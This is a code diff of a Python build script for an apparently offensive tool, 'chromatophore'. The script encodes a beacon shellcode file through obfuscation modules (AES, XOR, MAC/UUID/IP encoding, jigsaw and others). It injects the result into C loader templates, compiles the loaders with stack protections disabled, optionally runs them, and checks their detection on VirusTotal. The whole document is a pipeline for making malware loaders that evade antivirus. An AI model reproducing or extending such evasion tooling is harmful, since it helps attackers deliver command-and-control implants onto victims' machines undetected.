@@ -2,6 +2,7 @@ import subprocess
 import os
 import sys
 
+from vt import scan_files
 
 from chromatophore.aes import aes
 from chromatophore.bin2mac import bin2mac
@@ -54,90 +55,65 @@ function_map = {
     "xor_multibyte": xor_multibyte.xor_multibyte,
 }
 
-    # no obfuscation
-    # // compile: cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcnoobfuscation.c /link /out:noobfuscation.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
 
-    # aes/
-    # // python3 aes.py met.bin
-    # // compile: cl.exe /nologo /Tcaes.c /link /out:aes.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
-    # Requires either the pycryptodome or pycryptodomex package (`python3 -m pip install pycryptodomex`) 
+def compile_all():
+    clean_files()
 
-    # bin2ip
-    # cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcbin2ipv4.c /link /OUT:bin2ipv4.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
-    # bin2ip.py -i met.bin 
-    # IPv4s = []
+    for module in function_map.keys():
+        print("Templating")
+        print("Module: " + module)
+
+        shellcode_file = "beacon.bin"
+        mod_data = function_map[module](shellcode_file)
+
+        template_input = "chromatophore\\{}\\{}.c".format(module, module)
+        template_output = "chromatophore\\{}\\{}_work.c".format(module, module)
+
+        convert_module(template_input, template_output, mod_data)
+        compile_module(module)
+
+
+def test_module():
+    module = "reverse_byte_order"
     
-    # bin2mac
-    # //  cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcbin2mac.c /link /OUT:bin2mac.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
-    # python3 bin2mac.py -i met.bin
-
-    # jargon
-    # cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcjargon.c /link /out:jargon.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
-    # jargon.py
-
-    # jigsaw
-    # cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcjigsaw.c /link /out:jigsaw.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
-    # python3 jigsaw.py met.bin
-
-    # offset
-    # cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcoffset.c /link /out:offset.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
-    # python3 offset.py -i met.bin
-
-    # reverse_byte_order
-    # compile: cl.exe /nologo /Tcreverse_byte_order.c /link /OUT:reverse_byte_order.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
-    # // python3 reverse_byte_order.py
-
-    # uuid
-    # python3 bin2uuid.py -i met.bin
-    # //  cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcuuid.c /link /out:uuid.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
-
-    # xor_single
-    # //	cl.exe /nologo /MT /Tcxor.c /link /out:xor.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
-    # python3 xor.py
-
-    # xor_multibyte
-    # //	cl.exe /nologo /Tcxor-multibyte-key.c /link /out:xor-multibyte-key.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
-    # // python3 xor.py
-
-
-def do():
-    # beacon.bin?
-    # 
-    # optional: create meterpreter shellcode
-    #   - out: output/shellcode.bin
-    #
-    # execute bin2mac/bin2mac.py with shellcode.bin
-    #   - out: shellcode_encoded
-    # 
-    # open bin2mac.c as template
-    #   - //SHELLCODE_ENCODED// to shellcode_encoded
-    #   - optional: add anti-emulation
-    #   - out: output/bin2mac.c
-    #
-    # compile output/bin2mac.c
-    #   - out: output/bin2mac.exe
-    #
-    # send to virustotal
-    #   - in: output/bin2mac.exe
-    #   - out: output/bin2mac.exe.json
-
-    module = "noobfuscation"
-
-    print("Templating")
-
     shellcode_file = "beacon.bin"
     mod_data = function_map[module](shellcode_file)
-
     print("Mod data: " + mod_data)
 
     template_input = "chromatophore\\{}\\{}.c".format(module, module)
     template_output = "chromatophore\\{}\\{}_work.c".format(module, module)
+    convert_module(template_input, template_output, mod_data)
+    compile_module(module)
+    #execute_module(module)
 
-    convert_template(template_input, template_output, mod_data)
-    compile_and_execute(module)
+
+def clean_files():
+    print("Cleaning files: ./chromatophore*_work.c, ./*.obj, output/*.exe")
+
+    # delete all files in output directory recursively with file extension .exe
+    output_dir = "chromatophore"
+    for root, dirs, files in os.walk(output_dir):
+        for file in files:
+            if file.endswith("_work.c"):
+                os.remove(os.path.join(root, file))
+                #print("Deleted: " + os.path.join(root, file))
     
+    # delete all files in this directory with file extension .obj
+    for file in os.listdir("."):
+        if file.endswith(".obj"):
+            os.remove(file)
+            #print("Deleted: " + file)
 
-def convert_template(template_input, template_output, mod_data, anti_emulation_data=""):
+    # delete all files in output directory with file extension .exe
+    output_dir = "output"
+    for root, dirs, files in os.walk(output_dir):
+        for file in files:
+            if file.endswith(".exe"):
+                os.remove(os.path.join(root, file))
+                #print("Deleted: " + os.path.join(root, file))
+
+
+def convert_module(template_input, template_output, mod_data, anti_emulation_data=""):
     print("Convert template: {} -> {}".format(template_input, template_output))
     with open(template_input) as template_file:
         template = template_file.read()
@@ -148,11 +124,10 @@ def convert_template(template_input, template_output, mod_data, anti_emulation_d
             output_file.write(template)
 
 
-def compile_and_execute(module):
+def compile_module(module):
     module_c = "chromatophore\\{}\\{}_work.c".format(module, module)
     module_exe = "output\\{}.exe".format(module)
 
-    print("Executing module: " + module)
     cmd = "cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tc{} /link /OUT:{} /SUBSYSTEM:CONSOLE /MACHINE:x64".format(
         module_c, module_exe
     )
@@ -163,13 +138,25 @@ def compile_and_execute(module):
         print("Error executing command: " + cmd)
         sys.exit(1)
 
+
+def execute_module(module):
+    module_exe = "output\\{}.exe".format(module)
+
     print("Executing module: " + module)
     result = subprocess.run(module_exe, shell=True)
 
 
 def main():
-    do()
-
+    if sys.argv[1] == "clean":
+        clean_files()
+    elif sys.argv[1] == "compile":
+        compile_all()
+    elif sys.argv[1] == "vt":
+        scan_files()
+    elif sys.argv[1] == "test":
+        test_module()
+    else:
+        print("Invalid argument. Use 'clean', 'compile', or 'vt'.")
 
 if __name__ == "__main__":
     main()
